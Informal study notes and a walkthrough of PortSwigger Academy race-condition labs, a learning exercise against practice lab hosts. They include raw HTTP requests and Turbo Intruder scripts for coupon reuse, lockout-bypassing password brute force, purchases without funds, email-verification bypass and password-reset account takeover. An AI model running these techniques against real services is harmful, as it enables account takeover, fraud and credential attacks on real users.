# Race Conditions

**Overview**
A race condition is a critical vulnerability that occurs when a system's behavior depends on the sequence or timing of uncontrollable events. In web security, this happens when multiple requests are sent almost simultaneously and the server attempts to process them concurrently. If the application's state (like an account balance, a usage limit, or an authentication step) is not properly locked or synchronized during this tiny "race window," attackers can force the server into an unintended, conflicting state.

**Impact**
Race conditions exploit the fundamental logic of backend processing, leading to severe consequences:
* **Limit Overruns:** Bypassing business logic restrictions to reuse single-use coupons, artificially inflate store credit, or vote multiple times.
* **Security Control Bypasses:** Evading anti-brute-force mechanisms (like account lockouts) by sending dozens of guesses before the database registers a single failure.
* **Authentication & MFA Evasion:** Exploiting multi-endpoint race conditions to skip mandatory 2FA steps or bypass email verification during account registration.
* **Account Takeover (ATO):** Creating collisions in time-sensitive processes (like password resets) to trick the server into sending a victim's reset token to an attacker-controlled email.

**What We Cover in This File:**
* **Network Synchronization Techniques:** Understanding HTTP/1 Last-Byte Sync vs. HTTP/2 Single-Packet attacks to eliminate network latency and hit the race window perfectly.
* **Exploiting State Machines:** Using Burp Repeater parallel sending to bypass coupon limits and cart validations.
* **Turbo Intruder Automation:** Writing custom Python scripts (`attack.py`) for the `RequestEngine` to queue and execute single-packet attacks for brute-forcing lockouts.
* **Partial Construction Flaws:** Weaponizing the tiny gap between database row creation and API key/token initialization, including using empty arrays (e.g., `token[]=`) to force null values.
* **Session Locking Bypasses:** Understanding how backend frameworks (like PHP) lock sessions, and how to evade these locks by racing multiple requests using distinct, unique session tokens.

---

race window : is the small time window that a race condition can happen in

race condition: is the requests racing to do the same action in the ame time

- **HTTP/1 – Last-Byte Sync:**
    
    You send each request **completely except for the very last byte**. Wait until all the requests are in this state, then send the final byte for all of them at the same time. This forces the server to start processing all the requests almost simultaneously.
    
- **HTTP/2 – Single-Packet Attack:**
    
    Instead of sending each request in a separate packet (which could cause delays for some of them), you **bundle all the requests into a single TCP packet**. This way, they all arrive at the server together and are processed at nearly the exact same time, eliminating network latency differences.
    
1. first lab is simple take the request of using the coupon in the cart make multiple copies in the repeater group press on the slide btn of send and use send in parallel  then hit send 
the request should look like this 

```jsx
POST /cart/coupon HTTP/2
Host: [0a2f00390410f3c182c7ecc9004b00df.web-security-academy.net](http://0a2f00390410f3c182c7ecc9004b00df.web-security-academy.net/)
Cookie: session=uLHXsWgl5WedRk5Hso36Anm1sFbtci50
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: [https://0a2f00390410f3c182c7ecc9004b00df.web-security-academy.net](https://0a2f00390410f3c182c7ecc9004b00df.web-security-academy.net/)
Referer: https://0a2f00390410f3c182c7ecc9004b00df.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
csrf=1lMFBeho3v6cooO2jGTbdcUjU5M0BZvk&coupon=PROMO20
```

another note make sure all the requests have the same http type cuz each type has a way of attack and burp help you by setting the methode automatically by checking the type HTTP/2 or HTTP/1 

1. okay for the second lab is a little bit different cuz you're tryina test a log in page, this login page locks outthe account after 3 failed tries 
to test for the vulnerability you can make a group in the repeater and send like 30 request in that group trying to log in with wrong credentials, and see all of them getting sent without getting the account locked out

BUT what if you want to try a wordlist using this vulnerability to log in 
here you need the turpo intruder,  
-right click on the request send it to the turpo intruder
-use single packet [attack.py](http://attack.py) 
-do a little changes to the script first you need to make your request has username=carlos&password=%s // %s is making password parameter the target here,

       -then change the for loop in the code to `for word in wordlists.clipboard` //    so that it loops on the worldlist you have in ur clipboard and add the parmater wordi in the engine.queue function   `engine.queue(target.req, word, gate='race1')`
then hit attack and see all the wordlist gets send and gives you all the responses

your script should look like this

```
def queueRequests(target, wordlists):
# if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
# if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
# for more information, check out <https://portswigger.net/research/smashing-the-state-machine>
engine = RequestEngine(endpoint=target.endpoint,
                       concurrentConnections=1,
                       engine=Engine.BURP2
                       )

# the 'gate' argument withholds part of each request until openGate is invoked
# if you see a negative timestamp, the server responded before the request was complete
for word in wordlists.clipboard:
    engine.queue(target.req, word, gate='race1')

# once every 'race1' tagged request has been queued
# invoke engine.openGate() to send them in sync
engine.openGate('race1')
def handleResponse(req, interesting):
table.add(req)

```

additional info:
 -you can filter your responses by using if condition 
def handleResponse(req, interesting):
if  ‘ 200 ok’  in req.response: // or whatever code it gives you once you logged in
table.add(req)
-in huge attacks you will need to cut ur attack or wordlist for small attacks cuz you might get locked out in middle duo to a lot of requests got sent
for word in open(’/usr/share/wordlists/rockyou.txt’).readlines()[0:30]: //readline func makes you assing from line 0 to 30 first then you repeat the attack with different numbers

engine.queue(target.req, word, gate='race1')

1. in this lab i want to talk first about 
**collision/overwrite**: this happens when two requests get missed up during order for example asking for resetting password for account A and account B in same time with huge amount of requests maybe the reset password token of account A gets sent to email B and vise versa 
 **Multi-endpoint race conditions:** this happens when you apply MFA but after you send the login request you apply another simple request with it ex get/my-profile if it works it means it takes a little bit of window time till it checks if you need to verify you MFA first 
and the code looks kinda like this 

```jsx
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```

gives you the session first and then check for your MFA

okay so now we are ready to solve the lab

-in this lab you need to buy a jacked but you don't have enough credit on the account so you will solve it this way 
-you realize that car request and the checkout request depends on the session cookie for the user 
-to start exploit you need to add a get request for the home page // it's only to warm up the connection to the server first the speed is important in this lab 
request:

```jsx
GET / HTTP/2
Host: [0a40003c03d984b0803b0d8500ed0052.web-security-academy.net](http://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net/)
Cookie: session=MgPalvHmR9Nxt5Rl9RJk7jZKsRpb7YgR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

-add any item that you have enough credit to but
-then add a request for adding the jacket to the cart

```jsx
POST /cart HTTP/2
Host: [0a40003c03d984b0803b0d8500ed0052.web-security-academy.net](http://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net/)
Cookie: session=MgPalvHmR9Nxt5Rl9RJk7jZKsRpb7YgR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: [https://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net](https://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net/)
Referer: https://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
productId=1&redir=PRODUCT&quantity=1
```

-then do the checkout before the system checks that you have added a new item to the cart

```jsx
POST /cart/checkout HTTP/2
Host: [0a40003c03d984b0803b0d8500ed0052.web-security-academy.net](http://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net/)
Cookie: session=MgPalvHmR9Nxt5Rl9RJk7jZKsRpb7YgR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: [https://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net](https://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net/)
Referer: https://0a40003c03d984b0803b0d8500ed0052.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
csrf=benrg3LNQk5zE4BIxN5XZ8dzx78NnWnc
```

test first for the normal behavior to see that in sequential case it checks first if you have enough amount of money 
but when u send in parallel you have the tiny time window to pass the request 

1. sometimes you need to send dummy requests to make the server more weak and start glitching making mistakes 
sometimes you need to send some normal get requests to warm up the connection first before you start your attack

so in this lab you will ask to change mail for your account to test1@exploit-0a7a00ed031682878062a86501f00054.exploit-server.net and the other request in parallel [wiener@exploit-0a7a00ed031682878062a86501f00054.exploit-server.net](mailto:wiener@exploit-0a7a00ed031682878062a86501f00054.exploit-server.net) and you will find a token send to your account which is weiner and if you press it, it will change the email to test1 
now that means you can do ATO just by making a collusion of reset mail requests at the same time
now send a request to change the mail to wiener@exploit-0a7a00ed031682878062a86501f00054.exploit-server.net and another one in the same group changes the mail to carlos@ginandjuice.shop try multiple times till you see on the reset mail page says “check the mail carlos@ginandjuice.shop” and you click on the link sent in ur email

request 1: 

```jsx
POST /my-account/change-email HTTP/1.1
Host: [0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net](http://0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net/)
Cookie: session=5r6XZ85dnLVP4PS9PJccB86j8YyEf61E
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: [https://0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net](https://0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net/)
Referer: https://0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
email=wiener%[40exploit-0a7a00ed031682878062a86501f00054.exploit-server.net](http://40exploit-0a7a00ed031682878062a86501f00054.exploit-server.net/)&csrf=SieyrgqPDi47AFQYusRayovypkzfEK4b
```

request 2 :

```jsx
POST /my-account/change-email HTTP/2
Host: [0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net](http://0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net/)
Cookie: session=5r6XZ85dnLVP4PS9PJccB86j8YyEf61E
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: [https://0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net](https://0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net/)
Referer: https://0a2300fd03c482c380aaa95b00ef00cc.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
[email=carlos@ginandjuice.shop](mailto:email=carlos@ginandjuice.shop)&csrf=SieyrgqPDi47AFQYusRayovypkzfEK4b
```

1. so in this lab there's a vulnerability called 
**Partial construction race conditions : some frameworks work with database in 2 steps create user row → then in a later query set the user’s API key).**
-That creates a **tiny intermediate state** where the object exists but a security-critical field (API key, token, password hash) is still uninitialized (null / empty).
-If you can send a crafted request during that window, you can sometimes make the app treat your injected value as the legitimate value and bypass checks.
-so in order to do that  Many frameworks parse array / nil inputs differently; you can use that to produce an “empty” or null value server-side:
PHP examples:
- `param[]=foo` → `param = ['foo']`
- `param[]=foo&param[]=bar` → `param = ['foo','bar']`
- `param[]` → `param = []` (empty array)

Ruby on Rails example:

- `param[key]` (no value) → server gets `{"param"=>{"key"=>nil}}`

so lets get back to the lab first you will try to make an empty token array using request look like this :

```jsx
POST /confirm?token[]= HTTP/2
Host: [0a510019036a3a82ed0dbef2004500c9.web-security-academy.net](http://0a510019036a3a82ed0dbef2004500c9.web-security-academy.net/)
Cookie: phpsessionid=zzmOS0XyUzI5AFHnBvTIpSEH89NSdT6D
Content-Length: 0
```

then in the same time you will try to register using ur own credentials if it worked right you should bypass the email verification

```jsx
POST /register HTTP/2
Host: [0a510019036a3a82ed0dbef2004500c9.web-security-academy.net](http://0a510019036a3a82ed0dbef2004500c9.web-security-academy.net/)
Cookie: phpsessionid=zzmOS0XyUzI5AFHnBvTIpSEH89NSdT6D
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: [https://0a510019036a3a82ed0dbef2004500c9.web-security-academy.net](https://0a510019036a3a82ed0dbef2004500c9.web-security-academy.net/)
Referer: https://0a510019036a3a82ed0dbef2004500c9.web-security-academy.net/register
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
csrf=fS9G0pOixzrP2MrUckJOFTQynEuSApCE&username=%s&email=test%[40ginandjuice.shop](http://40ginandjuice.shop/)&password=test
```

now use the registration request in the turpo intruder 
and your script should look like smth like this 

```python

def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a510019036a3a82ed0dbef2004500c9.web-security-academy.net
Cookie: phpsessionid=zzmOS0XyUzI5AFHnBvTIpSEH89NSdT6D
Content-Length: 0

'''
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'test' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
    
```

additional info :

 →   make sure to use a new username and new email that u didnt use to assign before 

- **Same session cookie:** both requests must use the **same session** (same cookie) so they touch the same server-side session state.
    - *BUT*: some frameworks (PHP native sessions) **lock the session** and process requests serially. If that happens your parallel requests will be processed one after the other and the race fails. Check for session locking first.
- **If session locking exists:** you cannot race on the same session. Two workarounds:
    1. Try different session tokens (but then they act on different sessions → likely no collision).
    2. Try to trigger the race on something not serialized (e.g., use endpoint that stores state per-request or uses DB rows keyed wrong).
- **HTTP request formatting:** make sure your raw requests are valid (CRLF lines, blank line after headers). Example good template:
    
    ```
    POST /confirm?token[]= HTTP/2
    Host: 0a510019036a3a82ed0dbef2004500c9.web-security-academy.net
    Content-Length: 0
    
    ```
    

1. okat in this lab you have a **time-sensitive vulnerability: 
first get the request for POST reset password it should look like smth like this** 

```python
POST /forgot-password HTTP/2
Host: [0a2400d80380973e83b10a0800c80052.web-security-academy.net](http://0a2400d80380973e83b10a0800c80052.web-security-academy.net/)
Cookie: phpsessionid=cxlk9dzB4iZXIDYB4qnLmv48z3jicrxO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: [https://0a2400d80380973e83b10a0800c80052.web-security-academy.net](https://0a2400d80380973e83b10a0800c80052.web-security-academy.net/)
Referer: https://0a2400d80380973e83b10a0800c80052.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
csrf=okeF4kuYcqSImWgP2hApx0eVWg6FkBQn&username=wiener
```

try to make two duplicates of this request and send then in parallel
- you will find there's a time difference between each response time 
-and you will get 2 reset passwords token but with different values
-here the server when it finds out youre using same session for two different requests it implements your requests one by one to make sure there's no RACE CONDITION
-but what if we use different sessions and different csrf for the two requests that what we gonna do 
-capture a new session id and a new csrf token (cuz csrf token here tied to the session id)
request should look like :

```python
GET /forgot-password HTTP/2
Host: 0a2400d80380973e83b10a0800c80052.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://0a2400d80380973e83b10a0800c80052.web-security-academy.net
Referer: https://0a2400d80380973e83b10a0800c80052.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```

- get the new session id and new csrf from the response of that request

-then uses the new session and the new csrf token for one request and the other request should have a different session id and csrf token 
-hit send and see that you get two different emails with the same time and same token 
-change one of the request username parameter to carlos and get the token on wiener email
-change the url parameter in the email link to carlos to get access to carlos reset password url
